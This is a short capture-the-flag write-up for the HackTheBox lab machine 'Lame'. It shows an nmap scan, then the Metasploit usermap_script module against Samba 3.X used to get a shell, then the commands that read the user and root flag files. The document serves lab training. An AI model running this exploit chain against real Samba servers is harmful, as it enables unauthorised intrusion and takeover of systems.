# Machine - Easy Linux - Lame

IP 10.10.10.3

## Contents

- [Tools](#tools)
- [Enumeration](#enumeration)
- [Exploitaton](#exploitation)
- [Walkthrough](#walkthrough)

## Tools

- nmap
- Metasploit

## Enumeration

- At first we use nmap (Network Mapping tool) to scan the box ip. When we run it we got list of some open ports and services running on those ports. On the Lame box we can see, open ports and services are, port 21 for vsftpd 2.3.4, port 22 for SSH, port 129 and 445 for Samba smbd 3.X-4.X `nmap -sV 10.10.10.3`
- When we google about those running services to gather information about those services, we get Samba smbd 3.X is vulnerable and fortunately an metasploit module is there to exploit the service.

## Exploitation

- Using metasploit we can use the exploit to shell the box.

    ```bash
    use exploit/multi/samba/usermap_script
    msf exploit(multi/samba/usermap_script) > set rhost 10.10.10.3
    msf exploit(multi/samba/usermap_script) > set lhost tun0
    msf exploit(multi/samba/usermap_script) > exploit 
    ```
  
- Now open home folder using terminal and find the user.txt.
   
  ```bash
  cd home
  ls
  cd makis
  ls
  cat user.txt
  ```

- Now goto root folder and find the root.txt.
  
  ```bash
  cd root
  ls
  cat root.txt
  ```

## Walkthrough

<a title="Lame HackTheBox 10.10.10.3 YouTube walkthrough" href="https://www.youtube.com/watch?v=sq0qVn3iLm0&list=PL6vr4adYIJuxZ6tzpWnpici8JX0sdPhwx&index=3" target="_blank">https://www.youtube.com/watch?v=sq0qVn3iLm0</a>


Author: [Zishan Ahamed Thandar](https://ZishanAdThandar.github.io)
